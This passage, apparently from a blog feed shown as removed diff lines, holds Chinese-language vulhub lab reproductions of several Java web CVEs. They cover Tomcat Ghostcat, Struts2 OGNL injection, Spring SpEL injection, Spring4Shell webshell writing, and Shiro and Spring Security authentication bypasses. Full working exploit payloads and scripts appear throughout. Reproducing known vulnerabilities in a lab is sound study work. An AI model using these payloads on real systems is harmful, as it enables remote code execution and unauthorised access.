协议的二进制头，直接输出内容</span><br><span class="line">            print(res.decode('utf-8', errors='ignore'))</span><br><span class="line">        s.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f"[!] Error: {e}")</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    import sys</span><br><span class="line">    host = sys.argv[1] if len(sys.argv) &gt; 1 else '127.0.0.1'</span><br><span class="line">    path = sys.argv[2] if len(sys.argv) &gt; 2 else '/WEB-INF/web.xml'</span><br><span class="line">    exploit(host, 8009, path)</span><br><span class="line">EOF</span><br><span class="line">#运行脚本获取xml文件</span><br><span class="line">python3 ghostcat.py 公网 /WEB-INF/web.xml</span><br></pre></td></tr></tbody></table></figure>
-
-<p>成功复现读取/WEB - INF/web.xml 文件</p>
-<p><img src="/2026/02/12/CVE-2020-1938/1773154158887.png" alt="1773154158887"></p>
-<p>后续进行文件包含，因为靶场环境是纯净的 tomcat，实际环境需要寻找上传点上传木马文件，这里直接写入到靶场中</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入敏感文件</span><br><span class="line">docker exec ghostcat-vulhub bash -c 'echo "&lt;% out.println(\"SUCCESS_RCE\"); %&gt;" &gt; /usr/local/tomcat/webapps/ROOT/proof.txt'</span><br><span class="line">#文件包含，并不是简单的txt，里面含有java代码，将静态文本强制解析为Java代码</span><br><span class="line">python3 ghostcat.py 公网 /proof.txt</span><br></pre></td></tr></tbody></table></figure>
-
-<p>出现 SUCCESS_RCE 表明成功实现文件包含，执行了代码</p>
-<p><img src="/2026/02/12/CVE-2020-1938/1773154229210.png" alt="1773154229210"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Tomcat</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Struts2 远程代码执行漏洞 CVE-2018-11776</title>
-    <url>/2026/02/04/CVE-2018-11776/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3 – 2.3.34  </li>
-<li>Struts 2.5 – 2.5.16</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>alwaysSelectFullNamespace 设置为 true</li>
-<li>package 标签未定义 namespace 或使用了通配符</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts2 将 URL 路径中的 namespace 当作 OGNL 表达式，在重定向跳转时对其进行二次解析，执行敏感命令。Struts2 中的 URL 结构通常为 http://域名/命名空间/Action 名.action，如果攻击者访问不存在的命名空间，且配置了 alwaysSelectFullNamespace = true，那么会将攻击者注入的 payload 提取出来，将动态变量赋值为攻击 payload，OGNL 引擎解析命名空间时候执行了恶意 payload</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-057</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2018-11776/1773323657480.png" alt="1773323657480"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/struts2-showcase 数据包</p>
-<p><img src="/2026/02/04/CVE-2018-11776/1773323699382.png" alt="1773323699382">发送到 Repeater 模块<br><img src="/2026/02/04/CVE-2018-11776/1773323750416.png" alt="1773323750416"></p>
-<p>将 URL 访问改成下面 payload，即在原本基础上添加即可，这里用 ${(777 * 777)} 是为了验证漏洞，下面对 payload 的特殊符号已经进行 url 编码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/struts2-showcase/%24%7B%28777%2A777%29%7D/actionChain1.action</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2018-11776/1773323786334.png" alt="1773323786334"></p>
-<p>响应码为 302，点击跟随重定向</p>
-<p><img src="/2026/02/04/CVE-2018-11776/1773323830540.png" alt="1773323830540"></p>
-<p>原链接出现了计算结果，执行了 OGNL 表达式，说明存在注入点</p>
-<p><img src="/2026/02/04/CVE-2018-11776/1773323872780.png" alt="1773323872780"></p>
-<p>下面执行更加敏感的命令，替换掉上面 ${(777 * 777)} 的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2018-11776/1773323920618.png" alt="1773323920618"></p>
-<p>响应码 302，进行重定向</p>
-<p><img src="/2026/02/04/CVE-2018-11776/1773323963853.png" alt="1773323963853"></p>
-<p>出现敏感命令执行的结果</p>
-<p><img src="/2026/02/04/CVE-2018-11776/1773324000078.png" alt="1773324000078"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring Data Commons 远程命令执行 CVE-2018-1273</title>
-    <url>/2026/02/08/CVE-2018-1273/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Spring Data Commons 1.13 - 1.13.10</li>
-<li>Spring Data Commons 2.0 - 2.0.5</li>
-<li>Spring Boot 1.5.0 - 1.5.11</li>
-<li>Spring Boot 2.0.0 - 2.0.1</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入木马</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring MVC 中，当用户通过 POST 表单提交数据，Spring Data 会尝试将请求参数绑定到后端 Java 对象或 Map 中，Spring Data 允许参数名通过方括号语法定位集合或 Map 中的元素（例如 tags [0] 或 users [‘admin’]），当 Spring Data 处理方括号 2 的参数名时候，会调用 MapDataBinder 进行解析，而系统直接调用 SpEL 引擎来解析方括号内容且不做过滤，攻击者可以通过参数名的方括号注入恶意 SpEL 代码实现命令执行</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2018-1273</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2018-1273/1773372745074.png" alt="1773372745074"></p>
-<p>使用 dirsearch 进行目录扫描</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">dirsearch -u http://公网:8080</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2018-1273/1773372808616.png" alt="1773372808616"></p>
-<p>访问 http://公网: 8080/users</p>
-<p><img src="/2026/02/08/CVE-2018-1273/1773372834224.png" alt="1773372834224"></p>
-<p>注册账号同时抓包</p>
-<p><img src="/2026/02/08/CVE-2018-1273/1773372888417.png" alt="1773372888417"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/08/CVE-2018-1273/1773372927639.png" alt="1773372927639"></p>
-<p>将输入请求主题内容替换为下面 payload，其中 touch /tmp/success 可以替换成其他敏感命令</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&amp;password=&amp;repeatedPassword=</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2018-1273/1773372980982.png" alt="1773372980982"></p>
-<p>发送后返回 500</p>
-<p><img src="/2026/02/08/CVE-2018-1273/1773373020167.png" alt="1773373020167"></p>
-<p>进入容器查看 /tmp 目录下的文件，发现 success，表示命令执行成功</p>
-<p><img src="/2026/02/08/CVE-2018-1273/1773373046364.png" alt="1773373046364"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Spring</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring Cloud Gateway 远程代码执行漏洞 CVE-2022-22947</title>
-    <url>/2026/02/04/CVE-2022-22947/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Spring Cloud Gateway 3.1.x - 3.1.1</li>
-<li>Spring Cloud Gateway 3.0.x - 3.0.7</li>
-<li>旧版本 / 停止维护版本</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>SpEL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>命令执行，进行反弹 shell，写入内存马（删除路由后还能驻留在内存中）</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Spring Cloud Gateway 提供了一个管理端点（/actuator/gateway/routes），允许管理员通过 HTTP 请求动态地添加、删除或修改路由配置，该端点暴露且未受保护，攻击者可以发送 POST 请求来定义新的路由，并在 filters 参数注入恶意代码，网关价值配置时候，会调用 ShortcutConfigurable 接口，该接口会将 filters 参数的值传给 SpEL 解析引擎。利用链分两个阶段，第一阶段为存储阶段，攻击者通过 T () 操作符调用 Java 环境敏感类来构造恶意代码，此时恶意代码仅仅作为字符串存在网关内存配置；第二阶段为触发阶段，加载过程网关会解析恶意表达式，解析成功后 Runtime.exec() 被调用，在服务器执行系统命令</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22947</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2022-22947/1773373437627.png" alt="1773373437627"></p>
-<p>用 burosuite 抓取 http://公网: 8080 数据包</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373497270.png" alt="1773373497270"></p>
-<p>发送 Repeater 模块</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373535216.png" alt="1773373535216"></p>
-<p>修改请求方法为 POST，路径修改为/actuator/gateway/routes/自定义名称，内容类型改为 Content-Type: appliaction/json，请求主体注入有害 payload</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373619156.png" alt="1773373619156"></p>
-<p>返回 201</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373650371.png" alt="1773373650371"></p>
-<p>应用刚添加的路由发送以下数据包，触发敏感命令执行，修改路径为/actuator/gateway/refresh，修改内容格式：Content-Type: application/x-www-form-urlencoded，发送</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373682194.png" alt="1773373682194"></p>
-<p>返回 200</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373718780.png" alt="1773373718780"></p>
-<p>修改请求方法为 GET，路径改为/actuator/gateway/routes/自定义名称，发送</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373749244.png" alt="1773373749244"></p>
-<p>返回执行结果</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373777399.png" alt="1773373777399"></p>
-<p>删除添加的路由，修改请求头为 DELETE，发送</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373810115.png" alt="1773373810115"></p>
-<p>发送 200</p>
-<p><img src="/2026/02/04/CVE-2022-22947/1773373835197.png" alt="1773373835197"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Spring</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shiro 认证绕过漏洞 CVE-2020-1957</title>
-    <url>/2026/02/08/CVE-2020-1957/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Apache Shiro 1.0.0-incubating - 1.5.1</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>权限绕过</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>Shiro 拦截器采用了路径匹配模式</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录管理后台，信息泄露</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在 Shiro 的 1.5.2 之前的版本中，WebUtils.getPathWithinApplication() 方法处理 URL 时候会根据分号对路径进行截断，会认为分号后面不属于路径一部分；而 Spring 框架在匹配控制器路由时候，会对 URL 进行标准化处理（例如解析穿越符..），它对分号处理方式不同。二者对请求的解析不一样，攻击者通过特殊构造/;/路径来绕过 Shiro 的过滤</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/shiro/CVE-2020-1957</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/08/CVE-2020-1957/1773379459769.png" alt="1773379459769"></p>
-<p>抓取 http://靶机 ip:8080/admin 数据包</p>
-<p><img src="/2026/02/08/CVE-2020-1957/1773379499778.png" alt="1773379499778"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/08/CVE-2020-1957/1773379535602.png" alt="1773379535602"></p>
-<p>直接发送会返回 302 重定向到登录页面</p>
-<p><img src="/2026/02/08/CVE-2020-1957/1773379578505.png" alt="1773379578505"></p>
-<p>修改路径/;/admin/</p>
-<p><img src="/2026/02/08/CVE-2020-1957/1773379613741.png" alt="1773379613741"></p>
-<p>发送后返回 200，说明成功绕过登录验证</p>
-<p><img src="/2026/02/08/CVE-2020-1957/1773379650630.png" alt="1773379650630"></p>
-<p>后续可以直接访问 http://公网: 8080/;/admin/，可以看到绕过了登录</p>
-<p><img src="/2026/02/08/CVE-2020-1957/1773379674688.png" alt="1773379674688"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Shiro</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring Security 认证绕过漏洞 CVE-2022-22978</title>
-    <url>/2026/02/04/CVE-2022-22978/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Spring Security 5.5.0 - 5.5.6</li>
-<li>Spring Security 5.6.0 - 5.6.3</li>
-<li>以及更早的停止维护版本。</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>权限绕过</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>Spring Security 默认使用 AntPathRequestMatcher</li>
-<li>正则表达式使用了点号（.）通配符</li>
-<li>未显式设置 caseInsensitive 或 DOTALL 参数</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>越权获取敏感信息</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>RegexRequestMatcher（正则匹配器）初始化未开启 DOTALL 模式（开启后点号匹配范围扩大，可以匹配包括换行符在内的所以字符），安全框架用正则匹配路径，由于. 无法识别 %0a，导致正则引擎判定匹配失败，即认为加入 %0a 不属于受保护的范围，绕过了权限检验，从而能够访问敏感业务信息</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22978</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2022-22978/1773377227416.png" alt="1773377227416"></p>
-<p>用 burpsuite 抓 http://公网: 8080 数据包</p>
-<p><img src="/2026/02/04/CVE-2022-22978/1773377288363.png" alt="1773377288363"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/04/CVE-2022-22978/1773377315682.png" alt="1773377315682"></p>
-<p>修改路径 / admin，访问 admin 页面，返回 404，确认有防护</p>
-<p><img src="/2026/02/04/CVE-2022-22978/1773377352454.png" alt="1773377352454"></p>
-<p>修改路径/admin/%0a，返回 200，成功绕过认证访问受保护资源</p>
-<p><img src="/2026/02/04/CVE-2022-22978/1773377378600.png" alt="1773377378600"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Spring</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Struts2 远程命令执行漏洞 CVE-2021-31805</title>
-    <url>/2026/02/04/CVE-2021-31805/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.0.0 - 2.5.29</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts 内部对象虽然被锁死了，但是 Struts2 运行在 Tomcat 容器，攻击者可以利用 Tomcat 的 InstanceManager 绕过沙箱（相当于 CVE-2021-31805 是对 CVE-2020-17530 修复的绕过），InstanceManager 新建的 org.apache.commons.collections.BeanMap 对象能绕过普通权限检查，直接操作 memberAccess 的私有属性，利用 BeanMap 的 put 方法把 excludedClasses（Struts2 内部的黑名单）改为空，再通过攻击链执行敏感命令。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-061</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2021-31805/1773370476053.png"></p>
-<p>访问 http://公网: 8080，执行 OGNL 表达式 %{(11 + 11).toString()}，下面是对符号 url 编码的 payload，并打开 F12 查看属性，发现属性值出现了 OGNL 表达式计算的结果，说明存在注入点</p>
-<p><img src="/2026/02/04/CVE-2021-31805/1773370569956.png" alt="1773370569956"></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#url编码特殊字符</span><br><span class="line">http://公网:8080?id=%25%7b+(11+%2b+11).toString()%7d</span><br></pre></td></tr></tbody></table></figure>
-
-<p>注入恶意 payload，可以将 id 替换成其他命令，通过 F12 查看回显</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?id=%25{(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application[%27org.apache.tomcat.InstanceManager%27]).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr[%27struts.valueStack%27]).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d{%27id%27}).(%23res%3d%23exec.exec(%23cmd))}</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/04/CVE-2021-31805/1773370598158.png" alt="1773370598158"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Spring Framework 远程代码执行漏洞 CVE-2022-22965</title>
-    <url>/2026/02/03/CVE-2022-22965/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li><font style="color:rgba(0, 0, 0, 0.75);">Spring Framework &lt; 5.3.18</font></li>
-<li><font style="color:rgba(0, 0, 0, 0.75);">Spring Framework &lt; 5.2.20</font></li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>参数绑定漏洞</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>无</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以进行反弹 shell</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>利用 Java 特性，对象互通且允许通过点号. 访问属性的属性，在 JDK9 中引入了 Module，Spring 没防住 class.module.classLoader，可以直接通过参数访问到 Tomcat 的类加载器。在 Tomcat 中有一个 AccessLogValve 组件负责记录访问日志，可以通过参数绑定来修改其配置，directory（日志存放目录）、prefix（日志文件名）、suffix（日志后缀）、fileDateFormat（日期后缀）、pattern（日志格式），将目录修改到 Web 根目录，将日志文件名确定，日志后缀改成.jsp，将日期后缀清空，防止文件名额外添加上日期，将 Java 恶意代码注入到日志格式中。最后通过日志功能，当攻击者发送请求，将设定好的文件存放到 Web 根目录，内容即构造的恶意 payload。pattern 模块有一段代码为 pattern=%25 {参数 1} i+ 其他代码 +%25 {参数 2} i，其中两个参数要放到 HTTP 请求头，后面分别接上 &lt;% 和 %&gt;//作为参数替换的内容，最后拼接成一段完整的 jsp 可执行代码。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/spring/CVE-2022-22965</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/03/CVE-2022-22965/1773376841338.png" alt="1773376841338"></p>
-<p>访问 http://公网: 8080</p>
-<p><img src="/2026/02/03/CVE-2022-22965/1773376862511.png" alt="1773376862511"></p>
-<p>用 burpsuite 抓取首页的数据包</p>
-<p><img src="/2026/02/03/CVE-2022-22965/1773376981313.png" alt="1773376981313"></p>
-<p>发送到 Repeater 模块</p>
-<p><img src="/2026/02/03/CVE-2022-22965/1773376942289.png" alt="1773376942289"></p>
-<p>在 GET 请求后添加 payload</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#注入的payload</span><br><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc1%7Di%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bc2%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=final_shell&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=</span><br><span class="line">#Java外壳，加在Host下一行，即HTTP请求头</span><br><span class="line">c1: &lt;%</span><br><span class="line">c2: %&gt;//</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="/2026/02/03/CVE-2022-22965/1773377030511.png" alt="1773377030511"></p>
-<p>返回响应码 200</p>
-<p><img src="/2026/02/03/CVE-2022-22965/1773377067593.png" alt="1773377067593"></p>
-<p>访问 http://公网: 8080/final_shell.jsp，返回响应码 500 说明成功注入 jsp 文件</p>
-<p><img src="/2026/02/03/CVE-2022-22965/1773377102776.png" alt="1773377102776"></p>
-<p>添加参数 cmd = id，即访问 http://公网: 8080/final_shell.jsp?cmd = id，返回页面如下</p>
-<p><img src="/2026/02/03/CVE-2022-22965/1773377131237.png" alt="1773377131237"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Spring</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Apache Shiro 认证绕过漏洞 CVE-2010-3863</title>
-    <url>/2026/02/08/CVE-2010-3863/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Apache Shiro 1.0.0-incubating</li>
-</ul>
-<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>权限绕过</p>
-<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>在 Shiro 配置文件中设置了基于路径的访问控制规则</li>
-</ul>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>登录管理后台，信息泄露</p>
